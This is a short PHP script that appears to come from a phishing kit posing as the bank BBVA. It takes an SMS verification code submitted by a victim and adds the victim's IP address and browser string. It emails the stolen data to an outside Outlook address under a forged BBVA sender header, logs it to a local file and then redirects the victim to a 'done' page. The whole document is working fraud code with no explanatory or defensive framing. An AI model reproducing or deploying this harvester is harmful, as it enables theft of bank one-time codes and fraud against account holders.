<?php
$ip = $_SERVER['REMOTE_ADDR'];
$agent=$_SERVER['HTTP_USER_AGENT'];


$message .= "-----|BBVA SMS 2|-----\n";
$message .= "SMS 2		: ".$_POST['signatureData']."\n";
$message .= "--------------------\n";
$message .= "IP  : ".$ip."\n";
$message .= "Brw : ".$agent."\n";
$message .= "--|Moukil $ip|--\n";
$to = "frank24156@outlook.com";
$subj = "BBVA SMS".$ip."\n";
$from = "From:BBVA <info@agricole.net>";
mail($to, $subj, $message, $from);

$n = fopen('../ip.txt','a');
fwrite($n,$message );
fclose($n);

@header("Location: done.html");
?>